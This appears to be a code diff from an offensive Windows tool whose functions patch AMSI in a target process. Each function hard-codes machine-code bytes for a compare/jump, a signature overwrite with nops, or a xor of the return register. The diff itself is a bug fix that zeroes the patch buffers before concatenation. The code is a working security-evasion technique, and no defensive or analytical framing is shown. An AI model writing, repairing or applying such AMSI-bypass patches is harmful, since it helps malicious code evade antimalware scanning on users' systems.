@@ -37,6 +37,7 @@ void AMS1patch1(HANDLE hproc) {
 	// 
 
 	char Patch[100];
+	ZeroMemory(Patch, 100);
 	lstrcatA(Patch, "\x81\x39\x44\x31\x52\x4B\x75\x3a");
 
 	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)Patch);
@@ -80,6 +81,7 @@ void AMS1patch2(HANDLE hproc) {
 	// 6:  90                      nop
 	// 7 : 90                      nop
 	char Patch[100];
+	ZeroMemory(Patch, 100);
 	lstrcatA(Patch, "\xC7\x01\x44\x31\x52\x4B\x90\x90");
 
 	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)Patch);
@@ -121,6 +123,7 @@ void AMS1patchxor(HANDLE hproc, int number) {
 	// 
 
 	char Patch[100];
+	ZeroMemory(Patch, 100);
 	lstrcatA(Patch, "\x48\x31\xC0");
 
 	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)Patch);
@@ -164,6 +167,7 @@ void AMS1xornop(HANDLE hproc, int number) {
 	// 
 
 	char Patch[100];
+	ZeroMemory(Patch, 100);
 	lstrcatA(Patch, "\x48\x31\xC0\x90\x90");
 
 	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)Patch);
